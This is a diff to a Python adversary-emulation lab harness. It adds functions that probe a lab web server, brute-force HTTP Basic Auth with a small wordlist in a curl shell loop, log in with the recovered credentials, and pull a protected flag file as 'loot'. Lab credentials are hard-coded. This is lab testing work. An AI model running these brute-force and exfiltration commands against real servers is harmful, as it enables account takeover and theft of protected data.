@@ -34,6 +34,13 @@ def _now() -> float:
 LAB_USER = "labuser"
 LAB_PASSWORD = "Lab-Demo-2026!"
 
+# Edge HTTP service witness (Apache <-> Nginx): the pre-staged HTTP Basic Auth
+# credential and the protected resource path. Declared in plain text so the
+# Q3 (preconditions pre-staged) box of the rubric is auditable.
+WEB_USER = "webadmin"
+WEB_PASSWORD = "Lab-Web-2026!"
+WEB_SECRET_PATH = "/secret/flag.txt"
+
 
 def _outcome_success(tid: str, evidence: list[str], notes: str,
                       duration: float) -> TechniqueOutcome:
@@ -355,9 +362,112 @@ def _t1005_exfil_passwd_to_attacker_disk(fleet: HostFleet, tid: str,
     )
 
 
+# ----------------------------------------------------------------------
+# Edge HTTP service witness (Apache <-> Nginx). The same HTTP Basic Auth
+# attack chain runs against either web server; the substituted free element
+# is the edge server itself, so both realizations execute it to completion.
+# ----------------------------------------------------------------------
+
+def _t1046_scan_webtarget(fleet: HostFleet, tid: str,
+                          run_dir: Path) -> TechniqueOutcome:
+    start = _now()
+    result = fleet.run_shell_on(
+        "attacker",
+        "curl -s -o /dev/null -w '%{http_code}' -m 5 http://webtarget/secret/ ; echo",
+        log_name="techniques/T1046_web_scan.log", timeout=20,
+    )
+    code = result.stdout.strip()
+    # Any HTTP status (2xx/3xx/4xx, e.g. the 401 challenge) means the edge
+    # service answered; a connection failure yields an empty/000 code.
+    ok = code[:1] in ("2", "3", "4")
+    if ok:
+        return _outcome_success(tid, ["techniques/T1046_web_scan.log"],
+                                 f"webtarget:80 answered HTTP {code}",
+                                 _now() - start)
+    return _outcome_failure(tid, ["techniques/T1046_web_scan.log"],
+                             f"no HTTP response from webtarget:80 (got {code!r})",
+                             _now() - start)
+
+
+def _t1110_001_web_guess(fleet: HostFleet, tid: str,
+                         run_dir: Path) -> TechniqueOutcome:
+    start = _now()
+    # The attacker iterates a tiny wordlist; one entry matches by pre-staging.
+    wordlist = ("Password1\nadmin\nletmein\n" + WEB_PASSWORD + "\nguest\nubuntu")
+    fleet.run_shell_on(
+        "attacker",
+        f"printf '{wordlist}\\n' > /tmp/web_wordlist.txt && wc -l /tmp/web_wordlist.txt",
+        log_name="techniques/T1110.001_web_wordlist.log", timeout=10,
+    )
+    result = fleet.run_shell_on(
+        "attacker",
+        ("while IFS= read -r pw; do "
+         "code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "
+         f"-u {WEB_USER}:\"$pw\" http://webtarget{WEB_SECRET_PATH}); "
+         "if [ \"$code\" = \"200\" ]; then echo \"FOUND: $pw\"; exit 0; fi; "
+         "done < /tmp/web_wordlist.txt; echo FOUND_NONE; exit 1"),
+        log_name="techniques/T1110.001_web_bruteforce.log", timeout=60,
+    )
+    if "FOUND:" in result.stdout:
+        return _outcome_success(tid, ["techniques/T1110.001_web_wordlist.log",
+                                       "techniques/T1110.001_web_bruteforce.log"],
+                                 "matched the HTTP Basic Auth password from a "
+                                 "6-entry wordlist",
+                                 _now() - start)
+    return _outcome_failure(tid, ["techniques/T1110.001_web_bruteforce.log"],
+                             "no wordlist entry authenticated. "
+                             f"tail: {result.stdout[-200:]}",
+                             _now() - start)
+
+
+def _t1078_web_valid_accounts(fleet: HostFleet, tid: str,
+                              run_dir: Path) -> TechniqueOutcome:
+    start = _now()
+    result = fleet.run_shell_on(
+        "attacker",
+        ("curl -s -o /dev/null -w '%{http_code}' -m 5 "
+         f"-u {WEB_USER}:{WEB_PASSWORD} http://webtarget{WEB_SECRET_PATH}; echo"),
+        log_name="techniques/T1078_web_auth.log", timeout=20,
+    )
+    if result.stdout.strip() == "200":
+        return _outcome_success(tid, ["techniques/T1078_web_auth.log"],
+                                 "authenticated to the protected resource with "
+                                 "the recovered credentials (HTTP 200)",
+                                 _now() - start)
+    return _outcome_failure(tid, ["techniques/T1078_web_auth.log"],
+                             "authenticated request did not return 200 "
+                             f"(got {result.stdout.strip()!r})",
+                             _now() - start)
+
+
+def _t1005_web_exfil(fleet: HostFleet, tid: str,
+                     run_dir: Path) -> TechniqueOutcome:
+    start = _now()
+    result = fleet.run_shell_on(
+        "attacker",
+        (f"curl -s -m 5 -u {WEB_USER}:{WEB_PASSWORD} "
+         f"http://webtarget{WEB_SECRET_PATH} | tee /tmp/web_loot.txt; echo"),
+        log_name="techniques/T1005_web_exfil.log", timeout=20,
+    )
+    if "LAB-WEB-SECRET" in result.stdout:
+        return _outcome_success(tid, ["techniques/T1005_web_exfil.log"],
+                                 "exfiltrated the protected secret over the "
+                                 "authenticated HTTP channel",
+                                 _now() - start)
+    return _outcome_failure(tid, ["techniques/T1005_web_exfil.log"],
+                             "secret not present in the response body. "
+                             f"tail: {result.stdout[-160:]}",
+                             _now() - start)
+
+
 # Recipe name -> callable. Lookup is driven by the campaign JSON's `recipe`
 # field so adding a technique is a 2-line change (function + registry).
 _RECIPE_REGISTRY = {
+    # Edge HTTP service witness (Apache <-> Nginx)
+    "scan_webtarget_http": _t1046_scan_webtarget,
+    "guess_web_basic_auth": _t1110_001_web_guess,
+    "web_valid_accounts": _t1078_web_valid_accounts,
+    "web_exfil_secret": _t1005_web_exfil,
     "scan_target1_ssh": _t1046_scan_target1,
     "guess_target1_password": _t1110_001_guess,
     "ssh_lateral_to_target1": _t1021_004_ssh_lateral,
